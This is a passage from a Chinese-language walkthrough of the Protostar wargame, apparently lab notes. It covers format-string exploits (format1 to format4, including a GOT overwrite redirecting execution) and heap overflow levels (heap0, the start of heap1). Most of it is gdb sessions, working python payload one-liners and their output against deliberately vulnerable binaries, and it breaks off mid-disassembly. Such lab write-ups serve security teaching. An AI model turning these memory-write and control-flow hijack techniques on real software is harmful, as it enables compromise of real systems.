#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target; //未赋值的全局变量会存放在bss段中

void vuln(char *string) //接收一个参数
{
  printf(string); //输出这个参数
  
  if(target) { //如果target中有数据
      printf("you have modified the target :)\n"); //输出
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]); //接收一个参数传给vuln函数
}
```

![image-20230307153002894](./Pwn/Protostar_format1.png)

如图所示，图中&target的位置是printf("AAAA%.20x%.20x%n")；中的AAAA所在的位置，即AAAA被写入了栈，而只要AAAA位置被写入了target的地址，就可以使用%n攻击来向target地址中写入数据，从而达成目的。

```python
(gdb) disassemble vuln #反汇编vuln函数
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:	push   %ebp
0x080483f5 <vuln+1>:	mov    %esp,%ebp
0x080483f7 <vuln+3>:	sub    $0x18,%esp
0x080483fa <vuln+6>:	mov    0x8(%ebp),%eax
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:	mov    0x8049638,%eax
0x0804840a <vuln+22>:	test   %eax,%eax
0x0804840c <vuln+24>:	je     0x804841a <vuln+38>
0x0804840e <vuln+26>:	movl   $0x8048500,(%esp)
0x08048415 <vuln+33>:	call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
End of assembler dump.
(gdb) b *0x0804841a #在vuln函数的leave处下断点
Breakpoint 1 at 0x804841a: file format1/format1.c, line 15.
(gdb) r AAAAAAAA%08x. #给个字符串在栈上看看位置
Starting program: /opt/protostar/bin/format1 AAAAAAAA%08x.

Breakpoint 1, vuln (string=0xbffffe78 "AAAAAAAA%08x.") at format1/format1.c:15
15	format1/format1.c: No such file or directory.
	in format1/format1.c
(gdb) p &target #拿到target地址
$2 = (int *) 0x8049638 
(gdb) x/160wx $esp #查看栈空间
0xbffffc60:	0xbffffe78	0x0804960c	0xbffffc98	0x08048469
0xbffffc70:	0xb7fd8304	0xb7fd7ff4	0xbffffc98	0x08048435
0xbffffc80:	0xbffffe78	0xb7ff1040	0x0804845b	0xb7fd7ff4
0xbffffc90:	0x08048450	0x00000000	0xbffffd18	0xb7eadc76
0xbffffca0:	0x00000002	0xbffffd44	0xbffffd50	0xb7fe1848
0xbffffcb0:	0xbffffd00	0xffffffff	0xb7ffeff4	0x0804824d
0xbffffcc0:	0x00000001	0xbffffd00	0xb7ff0626	0xb7fffab0
0xbffffcd0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffffce0:	0xbffffd18	0x4f7b95de	0x653aa3ce	0x00000000
0xbffffcf0:	0x00000000	0x00000000	0x00000002	0x08048340
0xbffffd00:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0xbffffd10:	0x00000002	0x08048340	0x00000000	0x08048361
0xbffffd20:	0x0804841c	0x00000002	0xbffffd44	0x08048450
0xbffffd30:	0x08048440	0xb7ff1040	0xbffffd3c	0xb7fff8f8
0xbffffd40:	0x00000002	0xbffffe5d	0xbffffe78	0x00000000
0xbffffd50:	0xbffffe86	0xbffffe9a	0xbffffeaa	0xbffffecd
0xbffffd60:	0xbffffee0	0xbffffeea	0xbffffef5	0xbfffff09
0xbffffd70:	0xbfffff4b	0xbfffff5a	0xbfffff71	0xbfffff82
0xbffffd80:	0xbfffff8b	0xbfffff96	0xbfffff9e	0xbfffffab
0xbffffd90:	0x00000000	0x00000020	0xb7fe2414	0x00000021
0xbffffda0:	0xb7fe2000	0x00000010	0x078bfbff	0x00000006
0xbffffdb0:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffdc0:	0x08048034	0x00000004	0x00000020	0x00000005
---Type <return> to continue, or q <return> to quit---c
0xbffffdd0:	0x00000007	0x00000007	0xb7fe3000	0x00000008
0xbffffde0:	0x00000000	0x00000009	0x08048340	0x0000000b
0xbffffdf0:	0x00000000	0x0000000c	0x00000000	0x0000000d
0xbffffe00:	0x00000000	0x0000000e	0x00000000	0x00000017
0xbffffe10:	0x00000000	0x00000019	0xbffffe3b	0x0000001f
0xbffffe20:	0xbfffffe1	0x0000000f	0xbffffe4b	0x00000000
0xbffffe30:	0x00000000	0x00000000	0xd8000000	0x6a379bcd
0xbffffe40:	0x3350d841	0xc253c246	0x69b38312	0x00363836
0xbffffe50:	0x00000000	0x00000000	0x00000000	0x706f2f00
0xbffffe60:	0x72702f74	0x736f746f	0x2f726174	0x2f6e6962
0xbffffe70:	0x6d726f66	0x00317461	0x41414141	0x41414141 #我在这里 AAAAAAAA的ASCII码值十六进制下是0x41
0xbffffe80:	0x78383025	0x4554002e	0x783d4d52	0x6d726574
0xbffffe90:	0x3635322d	0x6f6c6f63	0x48530072	0x3d4c4c45
0xbffffea0:	0x6e69622f	0x7361622f	0x53530068	0x4c435f48
0xbffffeb0:	0x544e4549	0x3239313d	0x3836312e	0x2e34342e
0xbffffec0:	0x20373431	0x30373036	0x32322032	0x48535300
0xbffffed0:	0x5954545f	0x65642f3d	0x74702f76	0x00312f73
(gdb) x/1s 0xbffffe78 #查看栈顶地址内存储的是 之前输入的 字符串
0xbffffe78:	 "AAAAAAAA%08x." 
(gdb) shell python -c 'print 0xbffffe78-0xbffffc64' #计算偏移
532 #532 / 4 = 133 即有133个word
(gdb) r $(python -c 'print "\x38\x96\x04\x08" + "%08x."*150') #测一测0x08049638会被写在哪里
Starting program: /opt/protostar/bin/format1 $(python -c 'print "\x38\x96\x04\x08" + "%08x."*150')
8�0804960c.bffff9b8.08048469.b7fd8304.b7fd7ff4.bffff9b8.08048435.bffffb93.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa38.b7eadc76.00000002.bffffa64.bffffa70.b7fe1848.bffffa20.ffffffff.b7ffeff4.0804824d.00000001.bffffa20.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa38.977bac89.bd305a99.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa64.08048450.08048440.b7ff1040.bffffa5c.b7fff8f8.00000002.bffffb78.bffffb93.00000000.bffffe86.bffffe9a.bffffeaa.bffffecd.bffffee0.bffffeea.bffffef5.bfffff09.bfffff4b.bfffff5a.bfffff71.bfffff82.bfffff8b.bfffff96.bfffff9e.bfffffab.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.078bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.00000000.0000000c.00000000.0000000d.00000000.0000000e.00000000.00000017.00000000.00000019.bffffb5b.0000001f.bfffffe1.0000000f.bff
Breakpoint 1, vuln (
    string=0xbffffb93 "8\226\004\b%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...)
    at format1/format1.c:15
15	in format1/format1.c
(gdb) c
Continuing.
ffb6b.00000000.00000000.00000000.30000000.1646fbaa.adfb3444.7ef75d33.696e46ea.00363836.00000000.00000000.74706f2f.6f72702f.74736f74.622f7261.662f6e69.616d726f.38003174.#该条注释前的是38 后面的是080496 可见存在偏移 偏移了三位 为了对齐 在payload之前加3个"A"
25080496.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.
Program exited normally.
(gdb) r $(python -c 'print "\x38\x96\x04\x08" + "AAA" + "%08x."*150') #修正偏移
Starting program: /opt/protostar/bin/format1 $(python -c 'print "\x38\x96\x04\x08" + "AAA" + "%08x."*150')
8�AAA0804960c.bffff9b8.08048469.b7fd8304.b7fd7ff4.bffff9b8.08048435.bffffb90.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa38.b7eadc76.00000002.bffffa64.bffffa70.b7fe1848.bffffa20.ffffffff.b7ffeff4.0804824d.00000001.bffffa20.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa38.495cd730.63172120.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa64.08048450.08048440.b7ff1040.bffffa5c.b7fff8f8.00000002.bffffb75.bffffb90.00000000.bffffe86.bffffe9a.bffffeaa.bffffecd.bffffee0.bffffeea.bffffef5.bfffff09.bfffff4b.bfffff5a.bfffff71.bfffff82.bfffff8b.bfffff96.bfffff9e.bfffffab.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.078bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.00000000.0000000c.00000000.0000000d.00000000.0000000e.00000000.00000017.00000000.00000019.bffffb5b.0000001f.bfffffe1.0000000f.
Breakpoint 1, vuln (
    string=0xbffffb90 "8\226\004\bAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08"...)
    at format1/format1.c:15
15	format1/format1.c: No such file or directory.
	in format1/format1.c
(gdb) c
Continuing.
bffffb6b.00000000.00000000.00000000.ce000000.ab891447.6c27db57.c6fddbc3.69bcf97d.00363836.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.08049638.#08049638在这里
25414141.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025. #从后往前数 计算08049638在第几个位置 得到其位置在132位 即131个格式化字符串后 在132位用%n写入 再用格式化字符串对齐150位
Program exited normally. #同时payload中的%08n n表示读取前方字符串个数 并将其个数写入到内存中 08表示写入宽度为8位 不够就用0补齐
(gdb) r $(python -c 'print "\x38\x96\x04\x08" + "AAA" + "%08x."*131 + "%08n." + "%08x."*18') #使用上面注释的分析编写payload
Starting program: /opt/protostar/bin/format1 $(python -c 'print "\x38\x96\x04\x08" + "AAA" + "%08x."*131 + "%08n." + "%08x."*18')
8�AAA0804960c.bffff9b8.08048469.b7fd8304.b7fd7ff4.bffff9b8.08048435.bffffb90.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa38.b7eadc76.00000002.bffffa64.bffffa70.b7fe1848.bffffa20.ffffffff.b7ffeff4.0804824d.00000001.bffffa20.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa38.a1f5e3c3.8bbe15d3.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa64.08048450.08048440.b7ff1040.bffffa5c.b7fff8f8.00000002.bffffb75.bffffb90.00000000.bffffe86.bffffe9a.bffffeaa.bffffecd.bffffee0.bffffeea.bffffef5.bfffff09.bfffff4b.bfffff5a.bfffff71.bfffff82.bfffff8b.bfffff96.bfffff9e.bfffffab.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.078bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.00000000.0000000c.00000000.0000000d.00000000.0000000e.00000000.00000017.00000000.00000019.bffffb5b.0000001f.bfffffe1.0000000f.bffffb6b.00000000.00000000.00000000.56000000.313c01de.b55e2f03.070acc4a.695dc4a0.00363836.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461..25414141.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.you have modified the target :) #此处可以看见攻击成功 已经修改了目标数据

Breakpoint 1, vuln (
    string=0xbffffb90 "8\226\004\bAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08"...)
    at format1/format1.c:15
15	in format1/format1.c
```

#### Format2

源程序中target需要等于64才可以控制程序，

```python
root@protostar:/opt/protostar/bin# objdump -t ./format2 | grep target
080496e4 g     O .bss	00000004              target #拿到target地址
root@protostar:/opt/protostar/bin# python -c 'print "AAAA" + "%08x"*10' | ./format2 
AAAA00000200b7fd8420bffffb0441414141783830257838302578383025783830257838302578383025 #发现A的ASCII码值前有24bit的偏移
target is 0 :(
root@protostar:/opt/protostar/bin# python -c 'print "\xe4\x96\x04\x08"*10 + "%08x"*3 + "%08n"' | ./format2
��������������������00000200b7fd8420bffffb04 #先输出10个080496e4的地址 然后内存中写入"%08x"*3即24bit的junk占好偏移 再写入了10个10个080496e4
you have modified the target :) #即写入了4*10 + 24 = 64bit 然后通过%08n攻击其中的080496e4，将读取到的长度64写入080496e4地址中 完成target的修改
```

#### Format3

##### Method1

```python
root@protostar:/opt/protostar/bin# python -c 'print "AAAA" + "0x%08x"*15' | ./format3
AAAA0x000000000xbffffac00xb7fd7ff40x000000000x000000000xbffffcc80x0804849d0xbffffac00x000002000xb7fd84200xbffffb040x414141410x302578300x783078380x78383025 #测试泄露位置 计算偏移 得到第12个地址为AAAA的ASCII 即前面有11*8=88位偏移
target is 00000000 :(
root@protostar:/opt/protostar/bin# objdump -t ./format3 | grep target
080496f4 g     O .bss	00000004              target #获取target地址
root@protostar:/opt/protostar/bin# python -c 'print "\xf4\x96\x04\x08" + "%08x"*11 + "%08n"' | ./format3 
��00000000bffffac0b7fd7ff40000000000000000bffffcc80804849dbffffac000000200b7fd8420bffffb04 #尝试向会泄露的内存中写入数据
target is 0000005c :(
```

```c
if(target == 0x01025544) { // 0x01025544 = 16930116(十进制)
      printf("you have modified the target :)\n");
  }
```

将target的判断值转为十进制个数 按照该数字构造payload并使用%n攻击 在构造时要考虑payload中其他参数的个数 总合16930116即可

```python
root@protostar:/opt/protostar/bin# python -c 'print "\xf4\x96\x04\x08" + "%16930032x" + "%08x"*10 + "%08n"' | ./format3
                                 0bffffac0b7fd7ff40000000000000000bffffcc80804849dbffffac000000200b7fd8420bffffb04
you have modified the target :)
```

```
payload分析
"\xf4\x96\x04\x08" + "%08x"*10 + "%16930032x" + "%08n"
首先需要确保%n攻击前的字符数为0x01025544 = 16930116个 注：是字符
\xf4\x96\x04\x08 地址是4个字符 占4个位置
"%08x"*10用来占位 88位的偏移有后面的"%16930032x" 所以"\xf4\x96\x04\x08"地址作为一个指针 写过去的数据直接覆盖即可
%n攻击前的个数已经确定 \xf4\x96\x04\x08也算4个字符 所以为了对齐 "%16930032x"由其他字符数相减得到
%n将长度0x01025544 = 16930116写入到第12位\xf4\x96\x04\x08的0x080496f4地址中去修改target
```

##### Method2

该方法意在拆分 0x01025544 为\x44 \x55 \x0102，三个部分分别对应十进制的68 85 258

![image-20230307213702012](./Pwn/Protostar_format3_method2.png)

```python
root@protostar:/opt/protostar/bin# python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"' | ./format3
������                                                       0         bffffac0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
```

##### Method3

[formatstring-1.2.pdf (stanford.edu)](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

```python
root@protostar:/opt/protostar/bin# python -c 'print "DDDD" + "\xf4\x96\x04\x08" + "DDDD" + "\xf5\x96\x04\x08" + "DDDD" + "\xf6\x96\x04\x08" + "DDDD" + "\xf7\x96\x04\x08" + "%x."*11 + "%220u%n%17u%n%173u%n%255u%n"' | ./format3
DDDD��DDDD��DDDD��DDDD��0.bffffac0.b7fd7ff4.0.0.bffffcc8.804849d.bffffac0.200.b7fd8420.bffffb04.                                                                                                                                                                                                                  1145324612       1145324612                                                                                                                                                                   1145324612                                                                                                                                                                                                                                                     1145324612
you have modified the target :)
```

#### Format4

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
//首先分析程序 程序没有调用hello函数 可以gdb调试得到hello地址用格式化字符串%n攻击修改某一个指针地址 使其跳转
int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
 
  printf(buffer); //但是格式化字符串必须由printf触发 即printf必须执行输出字符%n才能获取输出长度并写入 即此处指针不能篡改

  exit(1);  //如此只能选择修改exit(1)的got指针 来使程序跳转到hello处
}

int main(int argc, char **argv)
{
  vuln();
}
```

```python
(gdb) disassemble vuln #反汇编vuln函数得到exit_plt地址0x80483ec
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   %ebp
0x080484d3 <vuln+1>:	mov    %esp,%ebp
0x080484d5 <vuln+3>:	sub    $0x218,%esp
0x080484db <vuln+9>:	mov    0x8049730,%eax
0x080484e0 <vuln+14>:	mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:	movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:	lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:	mov    %eax,(%esp)
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:	mov    %eax,(%esp)
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	movl   $0x1,(%esp)
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
End of assembler dump.
(gdb) disassemble 0x80483ec #反汇编exit_plt得到exit_got指针地址*0x8049724
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:	jmp    *0x8049724
0x080483f2 <exit@plt+6>:	push   $0x30
0x080483f7 <exit@plt+11>:	jmp    0x804837c
End of assembler dump.
(gdb) print hello #输出hello函数地址0x80484b4
$1 = {void (void)} 0x80484b4 <hello>
(gdb) r
Starting program: /opt/protostar/bin/format4 
AAAA%p%p%p%p%p%p%p #输出A的ASCII码值位置在第四个参数，将要修改的指针地址放在第四个参数位置上用%n攻击任意写修改
AAAA0x2000xb7fd84200xbffff5e40x414141410x702570250x702570250x70257025

#payload构造解析:
#已知：要修改的指针地址为0x8049724 hello函数地址0x80484b4 需要将hello函数地址0x80484b4写入到exit_got指针处
#hello函数地址0x80484b4的机器码为\xb4\x84\x04\x08 小端序十进制为180 132 04 08 可以将后两位看作一位180 132 804
#	\xb4	\x84	\x04	\x08
#	180		 132	 04	      08
#	180		 132	 (    804   )
#但是180 132 804从左向右并非是从小到大 影响构造payload 如此可以接着补位向后继续写 \xb4\x84\x04\x08\x05 结果如下
#	\xb4	\x84	\x04	\x08	\x05 十六进制
#	180		 132	 04	      08      05 十进制
#	\xb4	(\x84	\x04)	(\x08	\x05) 十六进制下数据拼接
#	180		(\x484 = 1156)   (\x508 = 1288) 十六进制拼接后转十进制
#如此便可以将数据按照从小到大的方式排列方便构造payload 因为是3个数据 所以exit_got指针需要按每个数据的位置布置好:
#exit_got指针地址:0x8049724		0x8049725	   0x8049725 一个4word中连续的地址
#                   \xb4	  (\x84	\x04)	  (\x08	\x05) 此处的\x05因为已经到了第5个word 所以会被挤出去
#				   180			 1156           1288      一个地址为4个word即\xb4\x84\x04\x08 = 0x80484b4
#三个连续的地址有3*4=12个字 所以180-12=168 即"%168x"产生168个字符 算上之前的输出共180的长度被%4$n写入到第4个参数位置
#1156-180=976 即"%976x"产生976个字符加上之前的输出共1156的长度被%5$n写入到第5个参数位置 剩下的同理
root@protostar:/opt/protostar/bin# python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x27\x97\x04\x08" + "%168x%4$n" + "%976x%5$n" + "%132x%6$n"' | ./format4
...
code execution redirected! you win
```

### Heap Exploitation

#### Heap0

测溢出长度，程序会输出堆中d的地址，查看堆内的数据，将溢出位置的数据修改为winner的地址

```python
buffer = ""
for i in range(0x41, 0x5b)
	buffer += chr(i)*4
print buffer #输出AAAABBBBCCCC....ZZZZ python h0.py > exp.txt
```

```python
gdb heap0
(gdb) disassemble main #反汇编
Dump of assembler code for function main:
0x0804848c <main+0>:    push   %ebp
0x0804848d <main+1>:    mov    %esp,%ebp
0x0804848f <main+3>:    and    $0xfffffff0,%esp
0x08048492 <main+6>:    sub    $0x20,%esp
0x08048495 <main+9>:    movl   $0x40,(%esp)
0x0804849c <main+16>:   call   0x8048388 <malloc@plt>
0x080484a1 <main+21>:   mov    %eax,0x18(%esp)
0x080484a5 <main+25>:   movl   $0x4,(%esp)
0x080484ac <main+32>:   call   0x8048388 <malloc@plt>
0x080484b1 <main+37>:   mov    %eax,0x1c(%esp)
0x080484b5 <main+41>:   mov    $0x8048478,%edx
0x080484ba <main+46>:   mov    0x1c(%esp),%eax
0x080484be <main+50>:   mov    %edx,(%eax)
0x080484c0 <main+52>:   mov    $0x80485f7,%eax
0x080484c5 <main+57>:   mov    0x1c(%esp),%edx
0x080484c9 <main+61>:   mov    %edx,0x8(%esp)
0x080484cd <main+65>:   mov    0x18(%esp),%edx
0x080484d1 <main+69>:   mov    %edx,0x4(%esp)
0x080484d5 <main+73>:   mov    %eax,(%esp)
0x080484d8 <main+76>:   call   0x8048378 <printf@plt>
0x080484dd <main+81>:   mov    0xc(%ebp),%eax
0x080484e0 <main+84>:   add    $0x4,%eax
---Type <return> to continue, or q <return> to quit---c
0x080484e3 <main+87>:   mov    (%eax),%eax
0x080484e5 <main+89>:   mov    %eax,%edx
0x080484e7 <main+91>:   mov    0x18(%esp),%eax
0x080484eb <main+95>:   mov    %edx,0x4(%esp)
0x080484ef <main+99>:   mov    %eax,(%esp)
0x080484f2 <main+102>:  call   0x8048368 <strcpy@plt> #下一条指令处下断点
0x080484f7 <main+107>:  mov    0x1c(%esp),%eax
0x080484fb <main+111>:  mov    (%eax),%eax
0x080484fd <main+113>:  call   *%eax
0x080484ff <main+115>:  leave
0x08048500 <main+116>:  ret
End of assembler dump.
(gdb) b *0x080484f7 #下断点 strcpy下一条
Breakpoint 1 at 0x80484f7: file heap0/heap0.c, line 38.
(gdb) r `cat exp.txt` #执行A*4-Z*4的junk
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 `cat exp.txt`
data is at 0x804a008, fp is at 0x804a050

Breakpoint 1, main (argc=2, argv=0xbffffd04) at heap0/heap0.c:38
38      heap0/heap0.c: No such file or directory.
        in heap0/heap0.c
(gdb) x/64wx d #查看d 发现数据是栈上的
0xbffffcc0:     0x00000000      0xb7ff6210      0xb7eadb9b      0xb7ffeff4
0xbffffcd0:     0x00000002      0x080483b0      0x00000000      0x080483d1
0xbffffce0:     0x0804848c      0x00000002      0xbffffd04      0x08048520
0xbffffcf0:     0x08048510      0xb7ff1040      0xbffffcfc      0xb7fff8f8
0xbffffd00:     0x00000002      0xbffffe15      0xbffffe2e      0x00000000
0xbffffd10:     0xbffffe97      0xbffffea7      0xbffffeb2      0xbffffed2
0xbffffd20:     0xbffffee5      0xbffffeef      0xbffffefa      0xbfffff3c
0xbffffd30:     0xbfffff50      0xbfffff5f      0xbfffff76      0xbfffff87
0xbffffd40:     0xbfffff90      0xbfffff9b      0xbfffffa3      0xbfffffb0
0xbffffd50:     0x00000000      0x00000020      0xb7fe2414      0x00000021
0xbffffd60:     0xb7fe2000      0x00000010      0x078bfbff      0x00000006
0xbffffd70:     0x00001000      0x00000011      0x00000064      0x00000003
0xbffffd80:     0x08048034      0x00000004      0x00000020      0x00000005
0xbffffd90:     0x00000007      0x00000007      0xb7fe3000      0x00000008
0xbffffda0:     0x00000000      0x00000009      0x080483b0      0x0000000b
0xbffffdb0:     0x00000000      0x0000000c      0x00000000      0x0000000d
(gdb) x/64wx 0x804a008 #查看程序中堆的数据 发现了填入的junk
0x804a008:      0x41414141      0x42424242      0x43434343      0x44444444
0x804a018:      0x45454545      0x46464646      0x47474747      0x48484848
0x804a028:      0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0x804a038:      0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0x804a048:      0x51515151      0x52525252      0x53535353      0x54545454
0x804a058:      0x55555555      0x56565656      0x57575757      0x58585858
0x804a068:      0x59595959      0x5a5a5a5a      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f8:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) print winner #拿到winner的地址
$1 = {void (void)} 0x8048464 <winner>
(gdb) c #继续执行
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? () #发现0x53位置溢出 返回上面的堆空间信息看 0x53535353在堆空间地址为 0x804a048 + 8 = 0x804a050
```

```python
buffer = ""
for i in range(0x41, 0x53): #左闭右开
        buffer += chr(i)*4

buffer += "\x64\x84\x04\x08" #winner地址 0x8048464

print buffer
```

```python
(gdb) r `python h0.py` #运行攻击脚本
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 `python h0.py`
data is at 0x804a008, fp is at 0x804a050

Breakpoint 1, main (argc=2, argv=0xbffffd24) at heap0/heap0.c:38
38      in heap0/heap0.c
(gdb) x/64wx 0x804a008 #确认已经修改溢出位置为winner函数地址
0x804a008:      0x41414141      0x42424242      0x43434343      0x44444444
0x804a018:      0x45454545      0x46464646      0x47474747      0x48484848
0x804a028:      0x49494949      0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c
0x804a038:      0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f      0x50505050
0x804a048:      0x51515151      0x52525252      0x08048464      0x00000000
0x804a058:      0x00000000      0x00020fa9      0x00000000      0x00000000
0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a078:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0e8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f8:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) c #继续
Continuing.
level passed #成功控制程序流程
```

#### Heap1

```shell
root@protostar:/opt/protostar/bin# ltrace ./heap1
__libc_start_main(0x80484b9, 1, 0xbffffd94, 0x8048580, 0x8048570 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++ #ltrace查看进程堆空间信息 四次malloc按顺序对应程序四次malloc
```

```python
root@protostar:/opt/protostar/bin# gdb heap1
(gdb) disas main
Dump of assembler code for function main:
0x080484b9 <main+0>:    push   %ebp
0x080484ba <main+1>:    mov    %esp,%ebp
0x080484bc <main+3>:    and    $0xfffffff0,%esp
0x080484bf <main+6>:    sub    $0x20,%esp
0x080484c2 <main+9>:    movl   $0x8,(%esp)
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    %eax,0x14(%esp)
0x080484d2 <main+25>:   mov    0x14(%esp),%eax
0x080484d6 <main+29>:   movl   $0x1,(%eax)
0x080484dc <main+35>:   movl   $0x8,(%esp)
0x080484e3 <main+42>:   call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:   mov    %eax,%edx
0x080484ea <main+49>:   mov    0x14(%esp),%eax
0x080484ee <main+53>:   mov    %edx,0x4(%eax)
0x080484f1 <main+56>:   movl   $0x8,(%esp)
0x080484f8 <main+63>:   call   0x80483bc <malloc@plt>
0x080484fd <main+68>:   mov    %eax,0x18(%esp)
0x08048501 <main+72>:   mov    0x18(%esp),%eax
0x08048505 <main+76>:   movl   $0x2,(%eax)
0x0804850b <main+82>:   movl   $0x8,(%esp)
0x08048512 <main+89>:   call   0x80483bc <malloc@plt>
0x08048517 <main+94>:   mov    %eax,%edx
---Type <return> to continue, or q <return> to quit---
0x08048519 <main+96>:   mov    0x18(%esp),%eax
0x0804851d <main+100>:  mov    %edx,0x4(%eax)
0x08048520 <main+103>:  mov    0xc(%ebp),%eax
0x08048523 <main+106>:  add    $0x4,%eax
0x08048526 <main+109>:  mov    (%eax),%eax
0x08048528 <main+111>:  mov    %eax,%edx
0x0804852a <main+113>:  mov    0x14(%esp),%eax
0x0804852e <main+117>:  mov    0x4(%eax),%eax
0x08048531 <main+120>:  mov    %edx,0x4(%esp)
0x08048535 <main+124>:  mov    %eax,(%esp)
0x08048538 <main+127>:  call   0x804838c <strcpy@plt>
